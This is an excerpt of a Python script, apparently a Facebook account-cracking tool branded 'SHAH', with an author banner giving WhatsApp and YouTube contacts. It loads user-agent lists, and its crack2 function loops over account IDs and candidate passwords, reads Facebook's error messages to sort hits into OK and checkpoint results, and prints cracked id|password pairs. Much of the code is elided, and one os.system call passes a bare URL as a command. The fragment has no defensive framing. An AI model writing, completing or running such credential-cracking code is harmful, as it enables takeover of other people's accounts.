...
except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Shah
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #Shah
...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Authur       \x1b[92;1m=>      \x1b[93;1lMURTAJIZ SHAH
\x1b[93;1m Whatsp       \x1b[92;1m=>      \x1b[93;1m+92317637136r
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1SHAH TECH
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Shah
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UCM2PAVypTrflOntP2gQ1oQg")
		exit()
	else:
		os.system("https://youtube.com/channel/UCM2PAVypTrflOntP2gQ1oQg")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [SHAH] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [SHAH-CP] %s|%s        '%(b,idf,pw))
